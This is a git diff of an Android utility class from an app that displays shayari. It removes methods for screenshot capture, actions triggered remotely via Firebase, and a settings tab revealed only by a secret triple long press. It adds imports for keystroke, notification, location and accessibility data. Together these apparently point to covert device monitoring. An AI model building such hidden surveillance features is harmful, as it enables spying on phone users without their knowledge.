@@ -3,17 +3,27 @@ package com.vikasyadavnsit.cdc.utils;
 import static android.app.Activity.RESULT_OK;
 import static android.content.Context.ALARM_SERVICE;
 import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;
+import static com.vikasyadavnsit.cdc.services.AppUsageStats.hasUsageStatsPermission;
+import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;
+import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getMessageText;
+import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getShayariData;
 
 import android.app.Activity;
 import android.app.AlarmManager;
+import android.bluetooth.BluetoothAdapter;
+import android.bluetooth.BluetoothDevice;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.location.LocationManager;
 import android.media.projection.MediaProjectionManager;
+import android.net.ConnectivityManager;
 import android.os.Build;
 import android.os.CountDownTimer;
 import android.os.Environment;
 import android.os.Handler;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.MotionEvent;
@@ -25,16 +35,28 @@ import androidx.appcompat.app.AppCompatActivity;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 import com.vikasyadavnsit.cdc.R;
+import com.vikasyadavnsit.cdc.constants.AppConstants;
+import com.vikasyadavnsit.cdc.data.AppUsageReportData;
+import com.vikasyadavnsit.cdc.data.KeyStrokeData;
+import com.vikasyadavnsit.cdc.data.NotificationData;
 import com.vikasyadavnsit.cdc.data.User;
 import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
+import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
+import com.vikasyadavnsit.cdc.fragment.ClickActionsFragment;
 import com.vikasyadavnsit.cdc.fragment.HomeFragment;
+import com.vikasyadavnsit.cdc.fragment.KeyStrokesFragment;
+import com.vikasyadavnsit.cdc.fragment.MessageFragment;
 import com.vikasyadavnsit.cdc.fragment.PlayFragment;
 import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
+import com.vikasyadavnsit.cdc.fragment.SystemAppUsageStatisticsFragment;
 import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
 import com.vikasyadavnsit.cdc.services.ScreenshotService;
 
 import java.lang.reflect.Type;
+import java.util.Comparator;
 import java.util.Map;
+import java.util.Objects;
+import java.util.TreeMap;
 
 public class ActionUtils {
 
@@ -93,99 +115,7 @@ public class ActionUtils {
         createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
     }
 
-    public static void registerPhoneStatistics(Activity activity) {
-        IntentFilter filter = new IntentFilter();
-        filter.addAction(Intent.ACTION_SCREEN_OFF);
-        filter.addAction(Intent.ACTION_SCREEN_ON);
-        filter.addAction(Intent.ACTION_USER_PRESENT);
-        activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
-    }
 
-    public static void requestExactAlarmPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
-            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(intent);
-        }
-    }
-
-    public static boolean canScheduleExactAlarms() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
-            return alarmManager.canScheduleExactAlarms();
-        }
-        return true; // For older versions, exact alarms are always allowed
-    }
-
-    public static void startMediaProjectionService(Activity activity) {
-        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
-    }
-
-    private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
-        if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
-            if (resultCode == RESULT_OK && data != null) {
-                Intent serviceIntent = new Intent(activity, ScreenshotService.class);
-                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
-                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
-                activity.startService(serviceIntent);
-            }
-        }
-    }
-
-    private static Runnable settingEnablerRunnable = () -> {
-        isLongPress = true;
-        pressCount++;
-        // Check if the pressCount reaches 3 within 30 seconds
-        if (pressCount == 3) {
-            Toast.makeText(context, "Settings Tab Enabled", Toast.LENGTH_SHORT).show();
-            context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.VISIBLE);
-        }
-
-        // If the timer is not running, start the 30-second timer
-        if (!isCounting) {
-            startCountDown();
-        }
-    };
-
-    private static void startCountDown() {
-        isCounting = true;
-        countDownTimer = new CountDownTimer(20000, 1000) { // 30 seconds countdown
-            @Override
-            public void onTick(long millisUntilFinished) {
-                // No action needed on each tick
-            }
-
-            @Override
-            public void onFinish() {
-                isCounting = false;
-                if (pressCount < 3) {
-                    context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.GONE);
-                }
-                pressCount = 0; // Reset press count after 30 seconds
-            }
-        };
-        countDownTimer.start();
-    }
-
-
-    public static void performFirebaseAction(Object obj) {
-        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
-        }.getType();
-        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
-        Log.d("ActionUtils", "Processing Remote Firebase Actions");
-        //DatabaseUtil dbUtils = DatabaseUtil.getInstance(context);
-        appTriggerSettingsDataMap.forEach((key, value) -> {
-            if (value.isEnabled()) {
-                Log.d("ActionUtils", "Performing Remote Firebase Action for : " + key);
-                value.getClickActions().getBiConsumer().accept(context, value);
-            }
-        });
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
-            ApplicationDataRepository.updateAllRecords(appTriggerSettingsDataMap);
-        }
-    }
 
 
     /**
@@ -415,37 +345,32 @@ public class ActionUtils {
     }
 
     /**
-     * Applies a shayari update (from Firebase or default) to the UI and updates local cached state.
+     * Picks the next shayari from the collection (round-robin per launch) and updates the UI.
+     * Increments the index on every app open, wrapping around when the collection is exhausted.
      *
-     * <p>This updates {@link HomeFragment}, computes the next shayari index based on whether the day
-     * changed, and persists the new state to SharedPreferences via
-     * {@link SharedPreferenceUtils#updateShayariData(Context, String)}.</p>
-     *
-     * @param obj Raw Firebase value for shayari text; may be {@code null}.
+     * @param shayaris Full list of shayaris fetched from Firebase; may be empty.
      */
-    public static void performShayariAction(Object obj) {
+    public static void performShayariAction(java.util.List<String> shayaris) {
         LoggerUtils.d("ActionUtils", "Loading Shayari ..");
 
-        // Get the Shayari of the day or use a default text if obj is null
-        String shayariOftheDay = Objects.isNull(obj) ? AppConstants.DEFAULT_SHAYARI_TEXT : obj.toString();
+        if (shayaris == null || shayaris.isEmpty()) {
+            HomeFragment.updateShayariText(AppConstants.DEFAULT_SHAYARI_TEXT, 1, 1);
+            return;
+        }
 
-        // Update the Shayari text in the fragment
-        HomeFragment.updateShayariText(shayariOftheDay);
+        String currentData = getShayariData(context);
+        String[] parts = currentData.split(":");
+        int lastIndex = 0;
+        try {
+            lastIndex = Integer.parseInt(parts[0]);
+        } catch (NumberFormatException ignored) {}
 
-        // Get the current shayari data from SharedPreferences
-        String currentShayariData = getShayariData(context);
-        String[] shayariDataParts = currentShayariData.split(":");
+        int total = shayaris.size();
+        int nextIndex = (lastIndex) % total;
+        String shayari = shayaris.get(nextIndex);
 
-        // Calculate the new shayari index
-        int currentIndex = Integer.parseInt(shayariDataParts[0]);
-        LocalDate lastUpdatedDate = LocalDate.parse(shayariDataParts[1], DateTimeFormatter.ISO_LOCAL_DATE);
-        int newIndex = (LocalDate.now().equals(lastUpdatedDate) ? currentIndex : currentIndex + 1);
-
-        // Prepare the new shayari data
-        String newShayariData = newIndex + ":" + LocalDate.now() + ":" + shayariOftheDay;
-
-        // Update the shayari data in SharedPreferences
-        SharedPreferenceUtils.updateShayariData(context, newShayariData);
+        HomeFragment.updateShayariText(shayari, nextIndex + 1, total);
+        SharedPreferenceUtils.updateShayariData(context, (nextIndex + 1) + ":" + total);
     }
 
 
